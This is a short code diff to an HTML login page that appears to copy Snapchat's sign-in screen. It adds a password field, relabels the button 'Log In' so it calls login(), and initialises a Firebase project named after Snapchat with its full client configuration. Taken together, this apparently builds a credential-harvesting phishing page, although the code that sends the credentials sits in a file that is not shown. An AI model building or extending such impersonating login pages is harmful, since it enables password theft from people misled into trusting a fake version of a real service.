@@ -42,8 +42,10 @@ Use phone number instead
 
 
 
+<input id="password" type="password" placeholder="Password">
+
 <button class="next" onclick="login()">
-Next
+Log In
 </button>
 
 
@@ -175,7 +177,29 @@ English (US)
 
 <script src="script.js"></script>
 
+<script type="module">
+  // Import the functions you need from the SDKs you need
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/12.15.0/firebase-app.js";
+  import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.15.0/firebase-analytics.js";
+  // TODO: Add SDKs for Firebase products that you want to use
+  // https://firebase.google.com/docs/web/setup#available-libraries
 
+  // Your web app's Firebase configuration
+  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+  const firebaseConfig = {
+    apiKey: "AIzaSyAfrRNq5DbrxY4lWOzMFcnpOmKbO6fadNs",
+    authDomain: "snapchat-c3858.firebaseapp.com",
+    projectId: "snapchat-c3858",
+    storageBucket: "snapchat-c3858.firebasestorage.app",
+    messagingSenderId: "224373823533",
+    appId: "1:224373823533:web:c2bda14fb6b9d22ed380a4",
+    measurementId: "G-S322LJVN9X"
+  };
+
+  // Initialize Firebase
+  const app = initializeApp(firebaseConfig);
+  const analytics = getAnalytics(app);
+</script>
 </body>
 
 </html>
